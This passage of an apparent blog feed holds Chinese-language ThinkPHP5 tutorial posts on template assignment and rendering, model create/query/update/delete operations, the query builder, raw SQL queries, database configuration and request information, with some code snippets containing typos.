      <link href="/undefined/12.thinkphp5%E8%A7%86%E5%9B%BE%E4%B9%8B%E6%A8%A1%E6%9D%BF%E8%B5%8B%E5%80%BC%E5%92%8C%E6%A8%A1%E6%9D%BF%E6%B8%B2%E6%9F%93/"/>
      <url>/undefined/12.thinkphp5%E8%A7%86%E5%9B%BE%E4%B9%8B%E6%A8%A1%E6%9D%BF%E8%B5%8B%E5%80%BC%E5%92%8C%E6%A8%A1%E6%9D%BF%E6%B8%B2%E6%9F%93/</url>
      
        <content type="html"><![CDATA[<h1 id="一丶视图之模板赋值和模板渲染"><a href="#一丶视图之模板赋值和模板渲染" class="headerlink" title="一丶视图之模板赋值和模板渲染"></a><font color=red>一丶视图之模板赋值和模板渲染</font></h1><h2 id="首先创建文件夹"><a href="#首先创建文件夹" class="headerlink" title="首先创建文件夹"></a><font color=green>首先创建文件夹</font></h2><p><img src= "/img/loading.gif" data-src="https://i.imgur.com/lu7oH89.png" alt="1"> </p><h2 id="1丶视图实例化"><a href="#1丶视图实例化" class="headerlink" title="1丶视图实例化"></a><font color=green>1丶视图实例化</font></h2><p>视图由\think\View类配合试图驱动（模板引擎）类一起完成，目前的内置模板引擎包含PHP原生模板和think模板引擎；   </p><p>因为新版的控制器可以无需继承任何的基础类，因此在控制器中如何使用视图决定于你怎么定义控制器。   </p><h2 id="2丶继承-think-Controller类"><a href="#2丶继承-think-Controller类" class="headerlink" title="2丶继承\think\Controller类"></a><font color=green>2丶继承\think\Controller类</font></h2><p>如果你的控制器继承了\think\Controller类的话，则无需自己实例化视图类，可以直接调用控制器基础类封装的相关视图类的方法。<br>|下面的方法可以直接被调用|方法|<br>|  —- | —- |<br>|fetch|渲染模板输出|<br>|display|渲染内容输出|<br>|assign|模板变量赋值|<br>|engine|初始化模板引擎|</p><h2 id="3丶模板赋值"><a href="#3丶模板赋值" class="headerlink" title="3丶模板赋值"></a><font color=green>3丶模板赋值</font></h2><p>除了系统变量和配置参数输出无需赋值外，其他变量如果需要在模板中输出必须首先进行模板赋值操作，绑定数据到模板输出有以下方式：   </p><h2 id="assign方法"><a href="#assign方法" class="headerlink" title="assign方法"></a><font color=green>assign方法</font></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">namespace index \appcontroller； </span><br><span class="line">class Index extends \think\Controller </span><br><span class="line">public function index（）</span><br><span class="line">&#x2F;模板变量赋值</span><br><span class="line">$name &#x3D;ThinkPHP：</span><br><span class="line">$eamil &#x3D;thinkphp@qq.comi </span><br><span class="line">$this-&gt;assign（&#39;name&#39;， $name ）</span><br><span class="line">$this-&gt;assign（‘email’,$email）</span><br><span class="line">&#x2F;&#x2F;或者批量赋值</span><br><span class="line">$this-&gt;assign（[</span><br><span class="line">        ‘name’ &#x3D;&gt; $name </span><br><span class="line">          &#39;email&#39;&#x3D;&gt;$email</span><br><span class="line">&#x2F;&#x2F;模板输出</span><br><span class="line">return $this-&gt;fetch（&#39;index&#39;）；</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4丶模板渲染"><a href="#4丶模板渲染" class="headerlink" title="4丶模板渲染"></a><font color=green>4丶模板渲染</font></h2><p>模板渲染最常用的是使用\think\View类的fetch方法，调用格式：   </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fetch(&#39;[模板文件]&#39;,[&#39;模板变量（数组）&#39;])</span><br></pre></td></tr></table></figure><p>模板文件的写法支持下面几种：<br>|用法|描述|<br>|——|————-|<br>|不带任何参数|自动定位当前操作的模板文件|<br>|模块[操作]|常用写法，支持跨模块|<br>|完整的模板文件名|直接使用完整的模板文件名(包括模板)|<br>下面是一个最典型的用法，不带任何参数：   </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;不带任何参数，自动定位当前操作的模板文件</span><br><span class="line">return $this-&gt;fetch();</span><br></pre></td></tr></table></figure><p>表示系统会按照默认规则自动定位模板文件，其规则是：   </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">当前模块&#x2F;默认视图目录&#x2F;当前控制器(小写)&#x2F;当前操作(小写).html;</span><br></pre></td></tr></table></figure><p>可以在fetch方法里面去写对应的模板名，他会去当前控制器下面去找对应的模板文件；</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;指定模板输出</span><br><span class="line">return $this-&gt;fetch(&#39;edit&#39;);</span><br></pre></td></tr></table></figure><p>另外fetch方法支持跨模块的操作</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">表示调用user控制器下面的user模板。</span><br><span class="line">return $this-&gt;fetch(&#39;user&#x2F;user&#39;);</span><br></pre></td></tr></table></figure><h3 id="调用方法："><a href="#调用方法：" class="headerlink" title="调用方法："></a>调用方法：</h3><p><img src= "/img/loading.gif" data-src="https://i.imgur.com/aKOSRYQ.png" alt="1"> </p><h2 id="5丶传入参数方法"><a href="#5丶传入参数方法" class="headerlink" title="5丶传入参数方法"></a><font color=green>5丶传入参数方法</font></h2><p>方法fetch可以传入模板变量，例如：   </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">namespace app\index\controller;</span><br><span class="line">class Index extends think\Controller &#123;</span><br><span class="line">        public function index()</span><br><span class="line">        &#123;</span><br><span class="line">            return sthis-&gt;fetch(&#39;index&#39;[</span><br><span class="line">                &#39;name&#39;&#x3D;&gt;&#39;Think PHP&#39;, &#39;email&#39;&#x3D;&gt;&#39;thinkphp@qq.com&#39;</span><br><span class="line">            ]);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="6丶助手函数"><a href="#6丶助手函数" class="headerlink" title="6丶助手函数"></a><font color=green>6丶助手函数</font></h2><p>如果使用view助手函数渲染输出的话，可以使用下面的方法进行模板变量赋值：  </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">return view(&#39;index&#39;,[</span><br><span class="line">    &#39;name&#39;&#x3D;&gt;&#39;thinkphp&#39;,</span><br><span class="line">    &#39;email&#39;&#x3D;&gt;&#39;thinkphp$qq.com&#39;</span><br><span class="line">]);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> thinkphp5 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> thinkphp5 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>11.thinkphp5模型操作之删除数据</title>
      <link href="/undefined/11.thinkphp5%E6%A8%A1%E5%9E%8B%E6%93%8D%E4%BD%9C%E4%B9%8B%E5%88%A0%E9%99%A4%E6%95%B0%E6%8D%AE/"/>
      <url>/undefined/11.thinkphp5%E6%A8%A1%E5%9E%8B%E6%93%8D%E4%BD%9C%E4%B9%8B%E5%88%A0%E9%99%A4%E6%95%B0%E6%8D%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="一丶模型操作之删除数据"><a href="#一丶模型操作之删除数据" class="headerlink" title="一丶模型操作之删除数据"></a><font color=red>一丶模型操作之删除数据</font></h1><h2 id="1丶删除当前模型"><a href="#1丶删除当前模型" class="headerlink" title="1丶删除当前模型"></a><font color=green>1丶删除当前模型</font></h2><p>删除模型数据，可以实例化模型后调用delete方法</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$user &#x3D; User::get(1);</span><br><span class="line">$user-&gt;delete();</span><br></pre></td></tr></table></figure><h2 id="2丶根据主键删除"><a href="#2丶根据主键删除" class="headerlink" title="2丶根据主键删除"></a><font color=green>2丶根据主键删除</font></h2><p>或者直接调用静态方法   </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">User::destroy(1)</span><br><span class="line">&#x2F;&#x2F;支持删除多个数据</span><br><span class="line">User::destroy(&#39;1,2,3&#39;);</span><br><span class="line">&#x2F;&#x2F;或者</span><br><span class="line">User::destroy([1,2,3]);</span><br></pre></td></tr></table></figure><h2 id="3丶条件删除"><a href="#3丶条件删除" class="headerlink" title="3丶条件删除"></a><font color=green>3丶条件删除</font></h2><p>使用数组进行条件删除，例如：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;删除状态为0的数据</span><br><span class="line">User::destroy([&#39;status&#39;&#x3D;&gt;0]);</span><br></pre></td></tr></table></figure><p>或者通过数据库类的查询条件删除</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">User::where(&#39;id&#39;,&#39;&gt;&#39;,10)-&gt;delete();</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> thinkphp5 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> thinkphp5 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>10.thinkphp5模型操作之查询数据</title>
      <link href="/undefined/10.thinkphp5%E6%A8%A1%E5%9E%8B%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE/"/>
      <url>/undefined/10.thinkphp5%E6%A8%A1%E5%9E%8B%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="一丶模型操作之查询数据"><a href="#一丶模型操作之查询数据" class="headerlink" title="一丶模型操作之查询数据"></a><font color=red>一丶模型操作之查询数据</font></h1><h2 id="1丶获取单个数据"><a href="#1丶获取单个数据" class="headerlink" title="1丶获取单个数据"></a><font color=green>1丶获取单个数据</font></h2><p><img src= "/img/loading.gif" data-src="https://i.imgur.com/r5MBwFC.png" alt="1"> </p><h2 id="2丶获取多个数据"><a href="#2丶获取多个数据" class="headerlink" title="2丶获取多个数据"></a><font color=green>2丶获取多个数据</font></h2><p><img src= "/img/loading.gif" data-src="https://i.imgur.com/4wU4rjB.png" alt="1"> </p><h2 id="3丶聚合"><a href="#3丶聚合" class="headerlink" title="3丶聚合"></a><font color=green>3丶聚合</font></h2><p><img src= "/img/loading.gif" data-src="https://i.imgur.com/0ZWVjMe.png" alt="1"> </p>]]></content>
      
      
      <categories>
          
          <category> thinkphp5 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> thinkphp5 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>9.thinkphp5模型操作之更新数据</title>
      <link href="/undefined/9.thinkphp5%E6%A8%A1%E5%9E%8B%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%9B%B4%E6%96%B0%E6%95%B0%E6%8D%AE/"/>
      <url>/undefined/9.thinkphp5%E6%A8%A1%E5%9E%8B%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%9B%B4%E6%96%B0%E6%95%B0%E6%8D%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="一丶模型操作之更新数据"><a href="#一丶模型操作之更新数据" class="headerlink" title="一丶模型操作之更新数据"></a><font color=red>一丶模型操作之更新数据</font></h1><h2 id="1丶查找并更新"><a href="#1丶查找并更新" class="headerlink" title="1丶查找并更新"></a><font color=green>1丶查找并更新</font></h2><p><img src= "/img/loading.gif" data-src="https://i.imgur.com/rHDc90y.png" alt="1"><br><font size=3>解释：  </font><br>调用UserModel模型的get方法;<br>“（1）”表示get主键为1的数据<br>save（）方法判断</p><h2 id="2丶直接更新数据"><a href="#2丶直接更新数据" class="headerlink" title="2丶直接更新数据"></a><font color=green>2丶直接更新数据</font></h2><p><img src= "/img/loading.gif" data-src="https://i.imgur.com/XUUONWY.png" alt="1"><br><font size=3>解释：  </font><br>还是调用get方法选择数据<br>save（）方法直接进行保存，将name保存为刘涛</p><h2 id="3丶批量更新数据"><a href="#3丶批量更新数据" class="headerlink" title="3丶批量更新数据"></a><font color=green>3丶批量更新数据</font></h2><p><img src= "/img/loading.gif" data-src="https://i.imgur.com/S6Nxat1.png" alt="1"> </p><h2 id="4丶通过数据库类更新数据"><a href="#4丶通过数据库类更新数据" class="headerlink" title="4丶通过数据库类更新数据"></a><font color=green>4丶通过数据库类更新数据</font></h2><p><img src= "/img/loading.gif" data-src="https://i.imgur.com/3DRiYoV.png" alt="1"> </p><h2 id="5丶静态方法"><a href="#5丶静态方法" class="headerlink" title="5丶静态方法"></a><font color=green>5丶静态方法</font></h2><p><img src= "/img/loading.gif" data-src="https://i.imgur.com/MppLkpE.png" alt="1"> </p>]]></content>
      
      
      <categories>
          
          <category> thinkphp5 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> thinkphp5 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>8.thinkphp5模型定义与新增数据</title>
      <link href="/undefined/8.thinkphp5%E6%A8%A1%E5%9E%8B%E5%AE%9A%E4%B9%89%E4%B8%8E%E6%96%B0%E5%A2%9E%E6%95%B0%E6%8D%AE/"/>
      <url>/undefined/8.thinkphp5%E6%A8%A1%E5%9E%8B%E5%AE%9A%E4%B9%89%E4%B8%8E%E6%96%B0%E5%A2%9E%E6%95%B0%E6%8D%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="一丶模型定义与新增数据"><a href="#一丶模型定义与新增数据" class="headerlink" title="一丶模型定义与新增数据"></a><font color=red>一丶模型定义与新增数据</font></h1><h2 id="模型定义"><a href="#模型定义" class="headerlink" title="模型定义"></a><font color=red>模型定义</font></h2><p><font color=red size=3>大多数情况下，我们无需为模型定义任何的属性和方法即可完成基础的操作。   </p><p>因为模型会自动对应一个数据表。   </font></p><p>规范是：数据库前缀+当前的模型类名（不含命名空间）因为模型类名是驼峰法，所以获取实际的数据表的时候会自动转换为小写+下划线命名的数据表名称。<br><font color = green size=3>先在数据库创建一个think_user数据表：<br><img src= "/img/loading.gif" data-src="https://i.imgur.com/Wu2V5it.png" alt="1"></p><p>模型定义的话先在application下，index模块下创建一个模型文件夹，创建一个User.php模型</font><br><img src= "/img/loading.gif" data-src="https://i.imgur.com/cUz5yF7.png" alt="1"><br>然后按照图示命名空间和继承thinkphp下的Modle模型；<br>然后在controller控制器下创建User.php控制器</p><h2 id="新增数据1"><a href="#新增数据1" class="headerlink" title="新增数据1"></a><font color=red>新增数据1</font></h2><p><img src= "/img/loading.gif" data-src="https://i.imgur.com/Xtf2ymH.png" alt="1">   </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$user-&gt;save()</span><br></pre></td></tr></table></figure><p>$user调用save（）这个方法；如果调用save这个方法有返回值，就表示用户新增成功</p><h2 id="新增数据2（使用create方法）"><a href="#新增数据2（使用create方法）" class="headerlink" title="新增数据2（使用create方法）"></a><font color=red>新增数据2（使用create方法）</font></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$user[&#39;name&#39;]&#x3D;&#39;yym&#39;;   </span><br><span class="line">$user[&#39;email&#39;]&#x3D;&#39;1806849051@qq.com&#39;;   </span><br><span class="line">$user[&#39;birthday&#39;]&#x3D;strtotime(&#39;1999-12-14&#39;);</span><br><span class="line">if($result &#x3D; UserModel::create($user))&#123;</span><br><span class="line">    return &#39;用户新增成功&#39;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    return &#39;用户新增失败&#39;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="新增数据3（批量新增数据）"><a href="#新增数据3（批量新增数据）" class="headerlink" title="新增数据3（批量新增数据）"></a><font color=red>新增数据3（批量新增数据）</font></h2><p><img src= "/img/loading.gif" data-src="https://i.imgur.com/3schQ0t.png" alt="1"> </p>]]></content>
      
      
      <categories>
          
          <category> thinkphp5 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> thinkphp5 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>7.thinkphp5数据库查询之查询构造器2</title>
      <link href="/undefined/7.thinkphp5%E6%95%B0%E6%8D%AE%E5%BA%93%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%9F%A5%E8%AF%A2%E6%9E%84%E9%80%A0%E5%99%A82/"/>
      <url>/undefined/7.thinkphp5%E6%95%B0%E6%8D%AE%E5%BA%93%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%9F%A5%E8%AF%A2%E6%9E%84%E9%80%A0%E5%99%A82/</url>
      
        <content type="html"><![CDATA[<h1 id="二丶数据库查询之查询构造器"><a href="#二丶数据库查询之查询构造器" class="headerlink" title="二丶数据库查询之查询构造器"></a><font color = red >二丶数据库查询之查询构造器</font></h1><h2 id="一丶查询数据"><a href="#一丶查询数据" class="headerlink" title="一丶查询数据"></a><font color = green >一丶查询数据</font></h2><p>最普通的查询就是判断某个字段是否等于某个值，而select（）方法用于查询数据集，如果查询成功，返回的是一个二维数组，如果没有满足条件的话则返回空数组。      </p><p>find（）方法用于查找满足条件的第一个记录（即使你的查询条件有多个符合的数据），如果查询成功，返回的是一个一维数组，没有满足条件的话默认返回null；   </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$result &#x3D; Db::name(&#39;data&#39;)-&gt;where(&#39;status&#39;,1)-&gt;find();   </span><br><span class="line">$result &#x3D; Db::name(&#39;data&#39;)-&gt;where(&#39;status&#39;,1)-&gt;select();</span><br></pre></td></tr></table></figure><h2 id="模糊查询："><a href="#模糊查询：" class="headerlink" title="模糊查询："></a><font color = green >模糊查询：</font></h2><p><font color = green >查询name中含有’明’的数据</font></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$result &#x3D; Db::name(&#39;data&#39;)-&gt;where(&#39;name&#39;,&#39;like&#39;,&#39;%明%&#39;)-&gt;select();</span><br></pre></td></tr></table></figure><h2 id="区间查询："><a href="#区间查询：" class="headerlink" title="区间查询："></a><font color = green >区间查询：</font></h2><p><font color = green >查询id区间为2~6的数据</font></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$result &#x3D; Db::name(&#39;data&#39;)-&gt;where(&#39;id&#39;,&#39;BETWEEN&#39;,[2,6])-&gt;select();</span><br></pre></td></tr></table></figure><h2 id="二丶添加数据："><a href="#二丶添加数据：" class="headerlink" title="二丶添加数据："></a><font color = green >二丶添加数据：</font></h2><h2 id="添加多条数据："><a href="#添加多条数据：" class="headerlink" title="添加多条数据："></a><font color = green >添加多条数据：</font></h2><p>添加多条数据直接向Db类的insertAll方法传入需要添加的数据即可。<br><img src= "/img/loading.gif" data-src="https://i.imgur.com/AJwt1dE.png" alt="1">   </p><h2 id="三丶更新数据："><a href="#三丶更新数据：" class="headerlink" title="三丶更新数据："></a><font color = green >三丶更新数据：</font></h2><p>Db::name(‘data’)-&gt;where(‘id’,1)-&gt;setFileld(‘name’,’thinkphp’);<br>setFiled方法返回数据的条数，没修改任何数据字段返回0；</p><h2 id="四丶自增或自减一个字段的值："><a href="#四丶自增或自减一个字段的值：" class="headerlink" title="四丶自增或自减一个字段的值："></a><font color = green >四丶自增或自减一个字段的值：</font></h2><p>setInc/setDec如果不加第二个参数，默认值为1   </p><h3 id="score-字段加1"><a href="#score-字段加1" class="headerlink" title="score 字段加1"></a><font color=green>score 字段加1</font></h3><p>Db::name(‘data’)-&gt;where(‘id’,1)-&gt;setInc(‘status’);   </p><h3 id="score-字段加5"><a href="#score-字段加5" class="headerlink" title="score 字段加5"></a><font color=green>score 字段加5</font></h3><p>Db::name(‘data’)-&gt;where(‘id’,1)-&gt;setInc(‘status’,5); </p><h3 id="score-字段减5"><a href="#score-字段减5" class="headerlink" title="score 字段减5"></a><font color=green>score 字段减5</font></h3><p>Db::name(‘data’)-&gt;where(‘id’,1)-&gt;setDec(‘status’,5);  </p>]]></content>
      
      
      <categories>
          
          <category> thinkphp5 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> thinkphp5 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>6.thinkphp5数据库查询之查询构造器1</title>
      <link href="/undefined/6.thinkphp5%E6%95%B0%E6%8D%AE%E5%BA%93%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%9F%A5%E8%AF%A2%E6%9E%84%E9%80%A0%E5%99%A81/"/>
      <url>/undefined/6.thinkphp5%E6%95%B0%E6%8D%AE%E5%BA%93%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%9F%A5%E8%AF%A2%E6%9E%84%E9%80%A0%E5%99%A81/</url>
      
        <content type="html"><![CDATA[<h1 id="二丶数据库查询之查询构造器"><a href="#二丶数据库查询之查询构造器" class="headerlink" title="二丶数据库查询之查询构造器"></a><font color = red >二丶数据库查询之查询构造器</font></h1><h2 id="1丶table方法选择数据表"><a href="#1丶table方法选择数据表" class="headerlink" title="1丶table方法选择数据表"></a><font color=green>1丶table方法选择数据表</font></h2><p><img src= "/img/loading.gif" data-src="https://i.imgur.com/OdaxDKH.png" alt="1">   </p><h2 id="2丶name方法"><a href="#2丶name方法" class="headerlink" title="2丶name方法"></a><font color = green >2丶name方法</font></h2><p><font size=3>由于我们在数据可以配置文件中设置了数据表的前缀为think_，因此，<font color = red >table方法</font>可以改成<font color = red >name方法</font>这样就不会因为数据表前缀的修改而改动CURD代码，例如：</font><br><img src= "/img/loading.gif" data-src="https://i.imgur.com/1VER43B.png" alt="1">   </p><h2 id="3丶助手函数db"><a href="#3丶助手函数db" class="headerlink" title="3丶助手函数db"></a><font color = green >3丶助手函数db</font></h2><p>传入的表名也是不带前缀的，原表名为think_data;<br><img src= "/img/loading.gif" data-src="https://i.imgur.com/SpkCjkC.png" alt="1">   </p><h2 id="4丶链式操作"><a href="#4丶链式操作" class="headerlink" title="4丶链式操作"></a><font color = green >4丶链式操作</font></h2><p>使用链式操作可以完成复杂的数据库查询操作，例如：<br><img src= "/img/loading.gif" data-src="https://i.imgur.com/FPsjaCj.png" alt="1"><br>链式操作不分先后，只要在查询方法（这里是select方法）之前调用就行。所以，下面的查询是等效的；<br><img src= "/img/loading.gif" data-src="https://i.imgur.com/VmyKyL7.png" alt="1">  </p><h3 id="支持链式操作的查询方法包括："><a href="#支持链式操作的查询方法包括：" class="headerlink" title="支持链式操作的查询方法包括："></a><font color = green >支持链式操作的查询方法包括：</font></h3><p><img src= "/img/loading.gif" data-src="https://i.imgur.com/3oi4RLJ.png" alt="1">  </p>]]></content>
      
      
      <categories>
          
          <category> thinkphp5 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> thinkphp5 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>4.thinkphp5数据库操作之原生查询</title>
      <link href="/undefined/4.thinkphp5%E6%95%B0%E6%8D%AE%E5%BA%93%E6%93%8D%E4%BD%9C%E4%B9%8B%E5%8E%9F%E7%94%9F%E6%9F%A5%E8%AF%A2/"/>
      <url>/undefined/4.thinkphp5%E6%95%B0%E6%8D%AE%E5%BA%93%E6%93%8D%E4%BD%9C%E4%B9%8B%E5%8E%9F%E7%94%9F%E6%9F%A5%E8%AF%A2/</url>
      
        <content type="html"><![CDATA[<h1 id="一丶数据库操作之原生查询"><a href="#一丶数据库操作之原生查询" class="headerlink" title="一丶数据库操作之原生查询"></a><font color=red>一丶数据库操作之原生查询</font></h1><h3 id="Db-类支持原生-SQL-查询操作，主要包括下面两个方法："><a href="#Db-类支持原生-SQL-查询操作，主要包括下面两个方法：" class="headerlink" title="Db 类支持原生 SQL 查询操作，主要包括下面两个方法："></a>Db 类支持原生 SQL 查询操作，主要包括下面两个方法：</h3><h4 id="1丶query-方法"><a href="#1丶query-方法" class="headerlink" title="1丶query 方法   "></a><font color=red>1丶query 方法   </font></h4><p>query 方法用于执行 SQL 查询操作，如果数据非法或者查询错误则返回false，否则返回查询结果数据集<br>（同 select 方法）。<br><font color=red>使用示例：</font><br>Db::query(“select * from think_user where status=1”);<br>如果你当前采用了分布式数据库，并且设置了读写分离的话，query方法始终是在读服务器执行，因此query方法对应的都是读操作，而不管你的SQL语句是什么。<br><font color=red>2丶execute 方法</font><br>execute用于更新和写入数据的sql操作，如果数据非法或者查询错误则返回false ，否则返回影响的记录数。<br><font color=red>使用示例：</font><br>Db::execute(“update think_user set name=’thinkphp’ where status=1”);<br>如果你当前采用了分布式数据库，并且设置了读写分离的话，execute方法始终是在写服务器执行，因此execute方法对应的都是写操作，而不管你的SQL语句是什么。 </p>]]></content>
      
      
      <categories>
          
          <category> thinkphp5 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> thinkphp5 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>3.thinkphp5数据库操作</title>
      <link href="/undefined/3.thinkphp5%E6%95%B0%E6%8D%AE%E5%BA%93%E6%93%8D%E4%BD%9C/"/>
      <url>/undefined/3.thinkphp5%E6%95%B0%E6%8D%AE%E5%BA%93%E6%93%8D%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<h1 id="配置文件定义"><a href="#配置文件定义" class="headerlink" title="配置文件定义"></a><font color=red>配置文件定义</font></h1><p>常用的配置方式是在应用目录或者模块目录下面的database.php中添加下面的参数：   </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">return [</span><br><span class="line">&#x2F;&#x2F; 数据库类型</span><br><span class="line">&#39;type&#39; &#x3D;&gt; &#39;mysql&#39;,</span><br><span class="line">&#x2F;&#x2F; 数据库连接DSN配置</span><br><span class="line">&#39;dsn&#39; &#x3D;&gt; &#39;&#39;,</span><br><span class="line">&#x2F;&#x2F; 服务器地址</span><br><span class="line">&#39;hostname&#39; &#x3D;&gt; &#39;127.0.0.1&#39;,</span><br><span class="line">&#x2F;&#x2F; 数据库名</span><br><span class="line">&#39;database&#39; &#x3D;&gt; &#39;thinkphp&#39;,</span><br><span class="line">&#x2F;&#x2F; 数据库用户名</span><br><span class="line">&#39;username&#39; &#x3D;&gt; &#39;root&#39;,</span><br><span class="line">&#x2F;&#x2F; 数据库密码</span><br><span class="line">&#39;password&#39; &#x3D;&gt; &#39;&#39;,</span><br><span class="line">&#x2F;&#x2F; 数据库连接端口</span><br><span class="line">&#39;hostport&#39; &#x3D;&gt; &#39;&#39;,</span><br><span class="line">&#x2F;&#x2F; 数据库连接参数</span><br><span class="line">&#39;params&#39; &#x3D;&gt; [],</span><br><span class="line">&#x2F;&#x2F; 数据库编码默认采用utf8</span><br><span class="line">&#39;charset&#39; &#x3D;&gt; &#39;utf8&#39;,</span><br><span class="line">&#x2F;&#x2F; 数据库表前缀</span><br><span class="line">&#39;prefix&#39; &#x3D;&gt; &#39;think_&#39;,</span><br><span class="line">&#x2F;&#x2F; 数据库调试模式</span><br><span class="line">&#39;debug&#39; &#x3D;&gt; false,</span><br><span class="line">&#x2F;&#x2F; 数据库部署方式:0 集中式(单一服务器),1 分布式(主从服务器)</span><br><span class="line">&#39;deploy&#39; &#x3D;&gt; 0,</span><br><span class="line">&#x2F;&#x2F; 数据库读写是否分离 主从式有效</span><br><span class="line">&#39;rw_separate&#39; &#x3D;&gt; false,</span><br><span class="line">&#x2F;&#x2F; 读写分离后 主服务器数量</span><br><span class="line">&#39;master_num&#39; &#x3D;&gt; 1,</span><br><span class="line">&#x2F;&#x2F; 指定从服务器序号</span><br><span class="line">&#39;slave_no&#39; &#x3D;&gt; &#39;&#39;,</span><br><span class="line">&#x2F;&#x2F; 是否严格检查字段是否存在</span><br><span class="line">&#39;fields_strict&#39; &#x3D;&gt; true,</span><br><span class="line">];</span><br></pre></td></tr></table></figure><p>type 参数支持命名空间完整定义，不带命名空间定义的话，默认采用 \think\db\connector 作为命名<br>空间，如果使用应用自己扩展的数据库驱动，可以配置为：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 数据库类型</span><br><span class="line">&#39;type&#39; &#x3D;&gt; &#39;\org\db\Mysql&#39;,</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> thinkphp5 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> thinkphp5 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2.thinkphp5请求</title>
      <link href="/undefined/2.thinkphp5%E8%AF%B7%E6%B1%82/"/>
      <url>/undefined/2.thinkphp5%E8%AF%B7%E6%B1%82/</url>
      
        <content type="html"><![CDATA[<h1 id="请求信息"><a href="#请求信息" class="headerlink" title="请求信息"></a><font color=red>请求信息</font></h1><h4 id="如果要获取当前的请求信息，可以使用-think-Request-类，"><a href="#如果要获取当前的请求信息，可以使用-think-Request-类，" class="headerlink" title="如果要获取当前的请求信息，可以使用 \think\Request 类，"></a>如果要获取当前的请求信息，可以使用 \think\Request 类，</h4><p>除了下文中的   </p><h3 id="request-Request-instance"><a href="#request-Request-instance" class="headerlink" title="$request = Request::instance();"></a>$request = Request::instance();</h3><p>也可以使用助手函数   </p><h3 id="request-request"><a href="#request-request" class="headerlink" title="$request = request();"></a>$request = request();</h3><h4 id="当然，最方便的还是使用注入请求对象的方式来获取变量。"><a href="#当然，最方便的还是使用注入请求对象的方式来获取变量。" class="headerlink" title="当然，最方便的还是使用注入请求对象的方式来获取变量。"></a>当然，最方便的还是使用注入请求对象的方式来获取变量。</h4><p>例如：   </p><h3 id="获取URL信息"><a href="#获取URL信息" class="headerlink" title="获取URL信息"></a>获取URL信息</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$request &#x3D; Request::instance();</span><br><span class="line">&#x2F;&#x2F; 获取当前域名</span><br><span class="line">echo &#39;domain: &#39; . $request-&gt;domain() . &#39;&lt;br&#x2F;&gt;&#39;;</span><br><span class="line">&#x2F;&#x2F; 获取当前入口文件</span><br><span class="line">echo &#39;file: &#39; . $request-&gt;baseFile() . &#39;&lt;br&#x2F;&gt;&#39;;</span><br><span class="line">&#x2F;&#x2F; 获取当前URL地址 不含域名</span><br><span class="line">echo &#39;url: &#39; . $request-&gt;url() . &#39;&lt;br&#x2F;&gt;&#39;;</span><br><span class="line">&#x2F;&#x2F; 获取包含域名的完整URL地址</span><br><span class="line">echo &#39;url with domain: &#39; . $request-&gt;url(true) . &#39;&lt;br&#x2F;&gt;&#39;;</span><br><span class="line">&#x2F;&#x2F; 获取当前URL地址 不含QUERY_STRING</span><br><span class="line">echo &#39;url without query: &#39; . 